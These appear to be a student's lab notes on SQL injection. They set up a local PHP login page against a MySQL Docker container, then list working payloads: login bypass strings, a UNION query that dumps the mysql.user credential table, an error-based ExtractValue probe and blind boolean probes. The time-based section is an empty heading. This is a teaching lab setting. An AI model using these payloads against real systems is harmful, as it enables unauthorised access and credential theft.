# SQL Injections

# Setup 

## Install PHP MySQL module
sudo apt install php-mysql
or php[version]-mysql (e.g., php8.1-mysql)

### Check if the module was installed
php -m -> should return msqli

## Run a mysql docker image:
sudo docker run --name mysql-container -e MYSQL_ROOT_PASSWORD=pass -p 3006:3306 mysql

## Inspect the address:
sudo docker inspect mysql-container | grep IPAddress

## Connect as root:
mysql -h 172.17.0.2 -u root -p

## Seeding the Database:
To fill the database, you could either run commands one by one from the MySQL client, or take the seed.sql file as an input (the file can be found on AulaWeb, along with the other files for the login application).

!!! Da fuori mysql
mysql -h 172.17.0.2 -u root -p < seed.sql;

## Login page
Copy or create the login page that can be found on AulaWeb

## Run the server
php -S localhost:<port>

# Standard SQL-Injection Attacks
If we know the username:
- username: <username>' -- -
- password: anything

If we don't know the username:
- username: any
- password: a' OR 1

To inject also in the (num_rows === 1) case:
- username: any
- password: a' OR 1 LIMIT <offset>,1 -- -

To inject also without single quotes:
- username: \
- password: or 1 LIMIT <offset>,1 -- -

# Union-Based SQL-Injection Attacks

- username: Arthur’ UNION ALL SELECT user AS username, null AS id, password AS password,NULL FROM mysql.user -- -

# Error-Based SQL-Injection Attacks

- username: Arthur’ AND 
            ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -

# Blind Boolean-Based SQL-Injection Attacks

- id:   1 AND (X)
        1 AND LENGTH(password)=<value>
        1 AND MID(password,<offset>,1)=<value> 

# Blind Time-Based SQL-Injection Attacks
